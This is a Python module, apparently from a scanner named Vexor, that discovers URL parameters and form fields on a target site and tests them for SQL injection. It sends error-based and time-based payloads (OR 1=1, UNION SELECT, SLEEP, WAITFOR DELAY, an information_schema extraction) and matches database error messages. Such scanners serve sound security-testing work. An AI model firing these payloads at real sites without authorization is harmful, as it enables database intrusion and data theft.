"""
Vexor SQL Injection Scanner
"""
import asyncio
import re
from typing import Optional
from vexor.modules.base import BaseScanner, Finding


# SQL error patterns
SQL_ERRORS = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"valid MySQL result", r"check the manual that corresponds to your MySQL",
    r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver",
    r"Warning.*oci_", r"Warning.*ora_",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"Microsoft SQL Native Client error",
    r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
    r"SQLite/JDBCDriver", r"SQLite.Exception",
    r"System.Data.SQLite.SQLiteException",
    r"Warning.*sqlite_", r"Warning.*SQLite3::",
    r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
    r"Npgsql\.", r"PG::SyntaxError:",
    r"DB2 SQL error", r"db2_", r"SQLSTATE",
    r"Sybase message", r"Warning.*sybase",
    r"You have an error in your SQL syntax",
    r"Division by zero in",
    r"supplied argument is not a valid MySQL",
]

# Time-based payloads
TIME_PAYLOADS = [
    "' AND SLEEP(3)--",
    "' AND SLEEP(3)#",
    "1' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--",
    "' OR SLEEP(3)--",
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR '1'='1'#",
    "' OR 1=1--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "1' ORDER BY 2--",
    "1' ORDER BY 3--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
]


class Scanner(BaseScanner):
    """SQL Injection Scanner"""

    MODULE_NAME = "sqli"
    MODULE_DESC = "SQL Injection Detection"

    async def scan(self) -> list[Finding]:
        """Run SQL injection scan"""
        async with self:
            # Get all forms and parameters from target
            params = await self._discover_params()

            tasks = []
            for url, param in params:
                tasks.append(self._test_sqli(url, param))

            results = await asyncio.gather(*tasks, return_exceptions=True)

        return self.findings

    async def _discover_params(self) -> list[tuple]:
        """Discover URL parameters and form inputs"""
        params = []
        response = await self.get(self.target)
        if not response:
            return params

        # Parse URL params
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(self.target)
        if parsed.query:
            qs = parse_qs(parsed.query)
            for key in qs:
                params.append((self.target, key))

        # Parse HTML forms
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'lxml')
            for form in soup.find_all('form'):
                action = form.get('action', '')
                if action:
                    form_url = self.target + action if action.startswith('/') else action
                else:
                    form_url = self.target

                for inp in form.find_all(['input', 'textarea']):
                    name = inp.get('name', '')
                    if name:
                        params.append((form_url, name))
        except Exception:
            pass

        return params

    async def _test_sqli(self, url: str, param: str) -> None:
        """Test a parameter for SQL injection"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import time

        # Error-based testing
        for payload in ERROR_PAYLOADS[:5]:  # Test first 5 for speed
            test_url = self._inject_param(url, param, payload)
            response = await self.get(test_url)

            if response and self._has_sql_error(response.text):
                self.add_finding(Finding(
                    severity="HIGH",
                    module=self.MODULE_NAME,
                    vuln="SQL Injection (Error-Based)",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=self._extract_error(response.text),
                    description=f"SQL injection found in parameter '{param}'",
                    remediation="Use parameterized queries / prepared statements",
                ))
                return  # Found, no need to test more

        # Time-based testing
        for payload in TIME_PAYLOADS[:2]:
            test_url = self._inject_param(url, param, payload)
            start = time.time()
            response = await self.get(test_url)
            elapsed = time.time() - start

            if elapsed >= 2.5:  # 3 second sleep, allow some margin
                self.add_finding(Finding(
                    severity="HIGH",
                    module=self.MODULE_NAME,
                    vuln="SQL Injection (Time-Based Blind)",
                    endpoint=url,
                    param=param,
                    payload=payload,
                    evidence=f"Response delayed {elapsed:.1f}s",
                    description=f"Time-based blind SQL injection in '{param}'",
                    remediation="Use parameterized queries / prepared statements",
                ))
                return

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _has_sql_error(self, text: str) -> bool:
        """Check if response contains SQL error"""
        for pattern in SQL_ERRORS:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        return False

    def _extract_error(self, text: str) -> str:
        """Extract SQL error from response"""
        for pattern in SQL_ERRORS:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 20)
                end = min(len(text), match.end() + 50)
                return text[start:end].strip()
        return "SQL error detected"
